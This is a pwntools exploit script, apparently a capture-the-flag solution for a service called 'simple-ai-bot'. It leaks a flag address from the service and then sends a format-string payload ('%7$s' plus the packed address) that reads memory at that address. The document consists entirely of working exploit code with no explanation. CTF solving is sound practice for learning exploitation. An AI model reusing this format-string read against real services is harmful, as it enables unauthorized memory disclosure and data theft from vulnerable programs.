from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

# vuln_path = "./pwn"
# elf = ELF(vuln_path)
# libc = elf.libc

io = remote("simple-ai-bot.ctf.zone", 4242)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

io.sendlineafter("> ", "flag")
io.recvuntil("in ", drop=True)
flag_addrss = int(io.recv(14), 16)
log.success("flag :-----> " + hex(flag_addrss))

payload = b"%7$stiny" + p64(flag_addrss)
io.sendlineafter("> ", payload)

io.interactive()
